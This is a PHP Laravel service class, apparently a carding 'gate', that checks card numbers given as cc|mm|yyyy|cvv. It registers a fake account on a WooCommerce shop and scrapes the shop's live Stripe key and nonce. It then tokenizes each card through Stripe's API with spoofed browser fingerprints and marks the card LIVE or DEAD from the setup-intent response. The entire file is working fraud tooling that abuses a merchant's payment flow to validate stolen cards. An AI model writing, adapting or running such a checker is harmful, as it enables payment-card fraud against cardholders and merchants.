<?php

namespace App\Services;

use Illuminate\Support\Str;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use Faker\Factory as Faker;
use Exception;

class EpicSwordsGate
{
    public function check(string $cc_raw): array
    {
        // 1. Validar y parsear formato cc|mm|yyyy|cvv
        if (!str_contains($cc_raw, '|')) {
            return [
                'result' => 'ERROR',
                'message' => 'Formato incorrecto (use cc|mm|yyyy|cvv)',
                'raw' => null
            ];
        }

        $parts = array_map('trim', explode('|', $cc_raw));
        if (count($parts) < 4) {
             return ['result' => 'ERROR', 'message' => 'Faltan datos en la CC', 'raw' => null];
        }
        
        list($cc_num, $mes, $anio, $cvv) = $parts;

        // 2. Configuración inicial
        $faker = Faker::create();
        $email = $faker->email;
        $cookieJar = new CookieJar();
        
        $headers_base = [
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0',
            'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language' => 'es,es-ES;q=0.9,en;q=0.8',
            'upgrade-insecure-requests' => '1'
        ];

        $client = new Client([
            'cookies' => $cookieJar,
            'headers' => $headers_base,
            'verify' => false,
            'timeout' => 25,
            'http_errors' => false // Para manejar 4xx/5xx manualmente sin excepciones
        ]);

        try {
            // --- PASO 1: Obtener Nonce ---
            $r1 = $client->get('https://www.epicswordscheckout.com/my-account/', ['query' => ['action' => 'register']]);
            $body1 = (string)$r1->getBody();

            if (!preg_match('/name="_wpnonce" value="([^"]+)"/', $body1, $matches)) {
                return ['result' => 'ERROR', 'message' => 'No se encontró _wpnonce', 'raw' => null];
            }
            $wpnonce = $matches[1];

            // --- PASO 2: Registrar Usuario ---
            $client->post('https://www.epicswordscheckout.com/my-account/', [
                'form_params' => [
                    'email' => $email,
                    '_wpnonce' => $wpnonce,
                    '_wp_http_referer' => '/my-account/?action=register',
                    'register' => 'Register'
                ]
            ]);

            // --- PASO 3: Obtener Keys Stripe ---
            $r3 = $client->get('https://www.epicswordscheckout.com/my-account/add-payment-method/');
            $body3 = (string)$r3->getBody();

            if (!preg_match('/"key":"(pk_live_[^"]+)"/', $body3, $m_key) || 
                !preg_match('/"add_card_nonce":"([^"]+)"/', $body3, $m_nonce)) {
                return ['result' => 'ERROR', 'message' => 'No se encontraron keys de Stripe', 'raw' => null];
            }

            $stripe_key = $m_key[1];
            $add_card_nonce = $m_nonce[1];

            // --- PASO 4: Tokenizar en Stripe ---
            $headers_stripe = array_merge($headers_base, [
                'accept' => 'application/json',
                'content-type' => 'application/x-www-form-urlencoded',
                'origin' => 'https://js.stripe.com',
                'referer' => 'https://js.stripe.com/',
            ]);

            $r4 = $client->post('https://api.stripe.com/v1/payment_methods', [
                'headers' => $headers_stripe,
                'form_params' => [
                    'type' => 'card',
                    'billing_details' => ['name' => '+', 'email' => $email],
                    'card' => [
                        'number' => $cc_num,
                        'cvc' => $cvv,
                        'exp_month' => $mes,
                        'exp_year' => substr($anio, -2),
                    ],
                    'key' => $stripe_key,
                    'guid' => (string) Str::uuid(),
                    'muid' => (string) Str::uuid(),
                    'sid'  => (string) Str::uuid(),
                    'payment_user_agent' => 'stripe.js/805cc890ee; stripe-js-v3/805cc890ee; split-card-element',
                    'time_on_page' => '15432',
                ]
            ]);

            $stripe_data = json_decode((string)$r4->getBody(), true);
            
            if (isset($stripe_data['error'])) {
                return [
                    'result' => 'DEAD', 
                    'message' => 'Stripe: ' . $stripe_data['error']['message'], 
                    'raw' => $stripe_data
                ];
            }

            $pm_id = $stripe_data['id'] ?? null;
            if (!$pm_id) return ['result' => 'ERROR', 'message' => 'No PM ID', 'raw' => $stripe_data];

            // --- PASO 5: Setup Intent (Resultado Final) ---
            $headers_ajax = array_merge($headers_base, [
                'x-requested-with' => 'XMLHttpRequest',
                'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin' => 'https://www.epicswordscheckout.com',
                'referer' => 'https://www.epicswordscheckout.com/my-account/add-payment-method/',
            ]);

            $r5 = $client->post('https://www.epicswordscheckout.com/?wc-ajax=wc_stripe_create_setup_intent', [
                'headers' => $headers_ajax,
                'form_params' => [
                    'stripe_source_id' => $pm_id,
                    'nonce' => $add_card_nonce
                ]
            ]);

            $result_raw = (string)$r5->getBody();

            // Análisis de respuesta
            if (str_contains($result_raw, '"success":true')) {
                return ['result' => 'LIVE', 'message' => 'Card Added Successfully', 'raw' => $result_raw];
            } 
            elseif (str_contains($result_raw, "Your card's security code is incorrect")) {
                return ['result' => 'LIVE', 'message' => 'Approved (CCN/CVV Incorrect)', 'raw' => $result_raw];
            } 
            elseif (str_contains($result_raw, "Your card was declined")) {
                return ['result' => 'DEAD', 'message' => 'Declined', 'raw' => $result_raw];
            }
            
            return ['result' => 'DEAD', 'message' => 'Error/Declined desconocido', 'raw' => $result_raw];

        } catch (Exception $e) {
            return [
                'result' => 'ERROR',
                'message' => 'Excepción: ' . $e->getMessage(),
                'raw' => null
            ];
        }
    }
}